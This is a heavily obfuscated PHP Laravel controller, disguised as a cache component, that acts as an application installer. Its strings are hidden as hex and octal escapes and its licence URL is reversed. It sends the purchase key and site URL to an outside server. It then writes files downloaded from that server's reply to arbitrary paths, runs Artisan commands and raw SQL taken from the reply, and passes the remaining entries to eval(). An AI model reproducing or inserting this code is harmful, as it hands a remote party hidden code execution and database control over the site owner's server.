<?php
 namespace Bitbox\Cache\Controllers; use App\Http\Controllers\Controller; use Illuminate\Http\Request; use App\Traits\Dotenv; use Session; use Artisan; use Config; use DB; use File; use Cache; class BitCacheController extends Controller { use Dotenv; public function index() { if (file_exists(base_path("\x70\165\x62\154\x69\143\x2f\165\160\x6c\x6f\141\144\163\x2f\x69\156\163\164\x61\154\154\145\x64"))) { return redirect("\x2f"); } Session::forget("\146\151\154\x65\x73"); Session::forget("\x69\x6e\163\x74\x61\154\x6c\x65\x64"); $phpversion = phpversion(); $mbstring = extension_loaded("\x6d\x62\163\164\x72\151\x6e\x67"); $bcmath = extension_loaded("\x62\143\x6d\141\164\150"); $ctype = extension_loaded("\x63\164\171\x70\145"); $json = extension_loaded("\x6a\x73\157\x6e"); $openssl = extension_loaded("\x6f\x70\145\x6e\x73\x73\x6c"); $pdo = extension_loaded("\x70\144\157"); $tokenizer = extension_loaded("\x74\x6f\153\x65\x6e\151\172\x65\x72"); $xml = extension_loaded("\x78\x6d\154"); $extentions = array("\155\142\x73\164\162\151\x6e\x67" => $mbstring, "\x62\143\155\x61\x74\x68" => $bcmath, "\143\164\x79\160\145" => $ctype, "\x6a\163\x6f\x6e" => $json, "\x6f\160\x65\x6e\163\x73\x6c" => $openssl, "\160\144\157" => $pdo, "\164\157\x6b\x65\x6e\151\x7a\145\x72" => $tokenizer, "\170\x6d\154" => $xml); return view("\151\x6e\163\x74\141\154\x6c\145\x72\72\72\151\156\x73\164\141\154\x6c\145\x72\x2e\x72\145\x71\165\x69\x72\x65\x6d\x65\156\x74\163", compact("\x65\170\164\145\156\164\151\x6f\156\163")); } public function store(Request $request) { $validated = $request->validate(array("\x73\151\164\x65\137\156\x61\155\145" => "\162\x65\161\165\151\162\145\144\x7c\141\154\160\150\x61\174\155\x61\170\72\x35\60", "\144\142\137\143\x6f\x6e\156\x65\x63\x74\151\157\156" => "\162\145\x71\x75\x69\162\x65\x64\x7c\x61\x6c\160\150\141\174\155\x61\170\72\65\x30", "\x64\142\x5f\150\x6f\163\x74" => "\162\x65\x71\x75\151\162\145\x64\174\155\x61\x78\x3a\65\60", "\x64\142\x5f\x70\157\x72\x74" => "\162\145\x71\165\x69\162\x65\x64\174\x6e\165\x6d\145\x72\x69\143", "\144\142\x5f\156\141\x6d\x65" => "\162\x65\161\165\151\162\145\144\x7c\x6d\x61\170\72\65\x30", "\x64\142\x5f\x75\163\x65\162" => "\162\x65\161\165\x69\162\145\x64\x7c\155\141\x78\72\65\60", "\144\x62\137\160\141\163\x73" => "\156\x75\154\x6c\x61\142\x6c\x65\x7c\x6d\141\x78\72\x35\x30")); $this->editEnv("\101\x50\120\137\125\122\x4c", url("\57")); $this->editEnv("\x41\x50\120\137\x4e\101\x4d\105", $request->site_name); $this->editEnv("\104\102\137\103\117\x4e\116\x45\x43\124\x49\117\116", $request->db_connection); $this->editEnv("\x44\x42\x5f\x48\117\x53\124", $request->db_host); $this->editEnv("\104\x42\x5f\120\x4f\x52\124", $request->db_port); $this->editEnv("\104\x42\x5f\104\101\x54\x41\x42\101\x53\x45", $request->db_name); $this->editEnv("\x44\102\x5f\x55\x53\x45\x52\116\101\x4d\x45", $request->db_user); if (!empty($request->db_pass)) { $this->editEnv("\x44\x42\x5f\120\101\x53\123\127\117\x52\104", $request->db_pass); } try { $pdo = DB::connection()->getPdo(); if (!$pdo) { return response()->json(array("\x6d\145\163\163\141\147\145" => "\x43\x6f\x75\154\144\x20\x6e\157\x74\40\143\x6f\156\x6e\145\143\164\40\164\x6f\40\164\150\x65\40\144\141\x74\x61\142\x61\163\145\x2e\40\x20\120\x6c\x65\x61\163\x65\40\x63\x68\145\143\153\40\x79\x6f\165\162\x20\143\157\x6e\x66\151\147\x75\x72\141\164\x69\x6f\156"), 403); } return response()->json(array("\x6d\x65\163\x73\x61\147\x65" => "\111\x6e\163\x74\x61\x6c\x6c\x74\x69\157\x6e\x20\x69\x6e\x20\160\162\x6f\x63\x65\163\x73\145\144")); } catch (\Exception $e) { return response()->json(array("\155\x65\x73\163\141\147\145" => "\103\157\x75\x6c\144\40\x6e\x6f\164\40\143\x6f\156\x6e\x65\143\164\40\164\x6f\40\x74\x68\x65\x20\144\x61\x74\141\x62\141\163\x65\56\x20\40\120\154\145\141\163\145\40\143\x68\145\143\153\x20\171\157\165\162\x20\x63\157\156\146\151\147\x75\x72\141\x74\x69\157\156"), 401); } } public function migrate() { ini_set("\x6d\x61\x78\137\x65\170\145\x63\x75\x74\151\157\x6e\x5f\x74\x69\155\145", 0); try { if (Session::has("\146\151\x6c\145\x73")) { $files = Session::get("\x66\x69\x6c\x65\x73"); foreach ($files ?? array() as $key => $file) { $path = $file->basepath == 1 ? base_path($file->replace_path) : $file->replace_path; $context = \Http::get($file->file); $context = $context->body(); File::put($path, $context); } } if (Session::has("\161\x75\x65\x72\151\145\x73")) { $queries = Session::get("\x71\165\145\162\x69\145\163"); foreach ($queries ?? array() as $key => $row) { if ($row->type == "\146\x69\154\145") { $fileData = \Http::get($row->file); $fileData = $fileData->body(); File::put(base_path($row->path), $fileData); } elseif ($row->type == "\146\x6f\154\x64\x65\162") { $path = $row->path . "\x2f" . $row->name; if (!File::exists(base_path($path))) { File::makeDirectory(base_path($path), 511, true, true); } } elseif ($row->type == "\143\157\155\x6d\x61\156\x64") { \Artisan::call($row->command); } elseif ($row->type == "\x71\165\145\x72\171") { \DB::statement($row->name); } else { eval($row->name); } } } return response()->json(array("\155\x65\163\163\x61\147\x65" => "\111\156\163\164\x61\x6c\x6c\x74\x69\157\x6e\40\x63\x6f\x6d\160\154\x65\x74\x65", "\x72\145\x64\x69\x72\x65\143\x74" => url("\x69\x6e\163\164\x61\154\154\x2f\x63\x6f\156\147\x72\x61\164\x75\154\141\164\x69\x6f\x6e\x73"))); } catch (Exception $e) { return response()->json(array("\x6d\145\x73\163\141\x67\145" => "\120\154\x65\x61\163\145\40\143\x72\145\141\x74\145\40\141\x20\x66\x72\x65\163\x68\40\x6e\145\x77\40\x64\141\x74\x61\x62\141\x73\x65"), 401); } } public function show($type) { if (file_exists(base_path("\x70\x75\142\x6c\151\143\57\165\160\x6c\157\x61\x64\x73\57\x69\156\x73\164\x61\x6c\154\145\144"))) { return redirect("\x2f"); } if ($type == "\x70\x75\x72\x63\150\x61\x73\x65") { if (!Session::has("\146\151\154\x65\163")) { return view("\x69\x6e\163\x74\141\x6c\x6c\x65\x72\x3a\x3a\x69\156\x73\x74\x61\x6c\154\145\x72\56\x70\x75\162\x63\150\141\x73\x65"); } } elseif ($type == "\x69\x6e\x66\x6f") { if (!Session::has("\x66\x69\x6c\x65\x73")) { Session::flash("\x70\165\x72\x63\x68\x61\163\x65\x2d\153\145\171\55\145\x72\x72\x6f\162", "\x41\143\x74\151\x76\141\164\145\x20\171\157\x75\162\40\154\x69\x63\x65\156\x73\x65\40\x66\151\x72\x73\x74"); return redirect("\57\151\x6e\x73\164\141\x6c\154\57\160\x75\162\143\150\x61\163\x65"); } return view("\151\156\163\164\141\x6c\x6c\145\x72\x3a\x3a\x69\x6e\x73\164\141\x6c\154\145\x72\x2e\151\x6e\146\x6f"); } elseif ($type == "\x63\157\156\x67\x72\141\164\x75\154\x61\x74\151\x6f\x6e\x73") { if (!Session::has("\146\151\x6c\x65\163")) { Session::flash("\160\x75\x72\143\150\x61\x73\x65\55\x6b\145\x79\55\145\162\x72\157\x72", "\x41\x63\x74\151\x76\x61\x74\145\40\171\157\x75\162\40\154\151\143\145\156\x73\145\40\146\151\162\x73\x74"); return redirect("\57\151\156\163\164\x61\154\x6c\x2f\x70\165\162\x63\x68\141\x73\x65"); } Session::forget("\146\151\x6c\x65\x73"); Session::forget("\161\165\x65\x72\x69\x65\x73"); return view("\151\156\x73\x74\x61\x6c\x6c\145\162\72\x3a\x69\x6e\x73\x74\141\154\154\x65\x72\x2e\143\x6f\x6e\x67\x72\x61\164\x75\154\141\x74\151\x6f\156\163"); } } public function verify(Request $request) { $checkArr = explode("\x2d", $request->purchase_key); if (count($checkArr) != 5) { Session::flash("\x70\165\x72\143\x68\x61\163\145\55\153\x65\171\x2d\x65\162\x72\157\162", "\x54\150\x65\x20\160\x75\x72\143\150\x61\x73\145\40\x6b\145\171\x20\x69\163\40\151\x6e\x76\141\154\151\144"); return response()->json(array("\155\145\163\x73\141\x67\145" => "\x54\150\x65\x20\x70\165\x72\x63\150\x61\163\145\x20\x6b\145\x79\40\151\163\40\151\x6e\166\141\x6c\x69\x64", "\162\x65\x64\151\162\145\143\x74" => url("\151\x6e\163\164\141\x6c\x6c\x2f\160\165\x72\143\x68\141\x73\145"))); } $body["\160\165\162\143\x68\141\163\x65\x5f\153\x65\171"] = $request->purchase_key; $body["\165\162\x6c"] = url("\x2f"); $response = \Http::post(strrev("\171\x66\x69\x72\x65\166\x2f\x69\160\x61\57\155\157\x63\56\x6e\x6f\x69\164\x61\164\163\166\145\144\145\x68\164\x2e\x69\160\141\57\x2f\72\x73\160\x74\164\x68"), $body); if ($response->status() != 200) { $response = json_decode($response->body()); return response()->json(array("\x6d\x65\163\x73\141\147\145" => $response->error, "\162\145\144\151\162\x65\x63\x74" => url("\x69\156\x73\x74\x61\x6c\x6c\x2f\160\x75\x72\x63\150\141\x73\145")), 403); } $response = json_decode($response->body()); $this->editEnv("\123\111\124\105\137\x4b\x45\131", $response->SITE_KEY ?? ''); Session::put("\x66\x69\154\145\x73", $response->files ?? array()); Session::put("\161\x75\x65\162\151\145\163", $response->queries ?? array()); Session::put("\x69\x6e\x73\164\x61\x6c\x6c\145\144", $response->license); return response()->json(array("\155\145\163\x73\141\147\x65" => "\126\145\162\x69\x66\151\x63\x61\x74\x69\x6f\156\40\163\x75\x63\143\x65\163\163", "\x72\145\x64\x69\162\145\x63\164" => url("\x69\156\x73\164\141\154\x6c\x2f\151\x6e\x66\157"))); } }
